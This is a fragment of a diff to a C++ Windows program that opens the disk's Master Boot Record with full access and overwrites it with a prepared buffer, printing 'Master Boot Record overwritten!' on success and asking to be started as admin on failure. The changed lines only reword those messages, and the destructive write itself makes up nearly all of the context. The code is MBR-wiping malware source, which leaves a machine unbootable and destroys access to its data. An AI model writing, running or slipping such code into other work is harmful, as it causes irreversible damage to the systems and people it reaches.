@@ -15,11 +15,11 @@ int main()
 		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
 		, NULL, OPEN_EXISTING, NULL, NULL);
 		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
-			cout << "GUTE" << endl;
+			cout << "Master Boot Record overwritten!" << endl;
 			ExitProcess(0);
 		}
 		else {
-			cout << "Start as admin";
+			cout << "Start as admin!";
 			Sleep(5000);
 			ExitProcess(0);
 		}
